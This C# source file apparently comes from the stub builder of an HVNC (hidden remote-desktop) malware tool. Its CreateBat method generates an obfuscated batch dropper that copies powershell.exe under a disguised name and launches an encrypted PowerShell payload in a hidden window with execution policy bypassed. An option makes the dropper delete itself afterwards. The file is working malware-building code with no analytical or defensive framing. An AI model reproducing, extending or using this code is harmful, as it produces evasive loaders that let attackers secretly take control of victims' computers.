using System;
using System.Text;

namespace BirdBrainmofo.HVNC.StubUtils
{
    public class FileGen
    {
        public static string CreateBat(byte[] key, byte[] byte_0, EncryptionMode mode, bool hidden, bool selfdelete, Random rng)
        {
            string input = StubGen.CreatePS(key, byte_0, mode, rng);
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.AppendLine("@echo off");
            (string, string) tuple = Obfuscator.GenCodeBat("copy C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", rng, 4);
            stringBuilder.AppendLine(tuple.Item1);
            stringBuilder.AppendLine(tuple.Item2 + " \"%~dp0%~nx0.exe\" /y");
            stringBuilder.AppendLine("cls");
            tuple = Obfuscator.GenCodeBat("cd %~dp0", rng, 4);
            stringBuilder.AppendLine(tuple.Item1);
            stringBuilder.AppendLine(tuple.Item2);
            tuple = Obfuscator.GenCodeBat("-noprofile " + (hidden ? "-windowstyle hidden" : string.Empty) + " -executionpolicy bypass -command ", rng, 2);
            stringBuilder.AppendLine(tuple.Item1);
            (string, string) tuple2 = Obfuscator.GenCodeBat(input, rng, 2);
            stringBuilder.AppendLine(tuple2.Item1);
            stringBuilder.AppendLine("\"%~nx0.exe\" " + tuple.Item2 + tuple2.Item2);
            if (selfdelete)
            {
                stringBuilder.AppendLine("(goto) 2>nul & del \"%~f0\"");
            }
            stringBuilder.AppendLine("exit /b");
            return stringBuilder.ToString();
        }
    }
}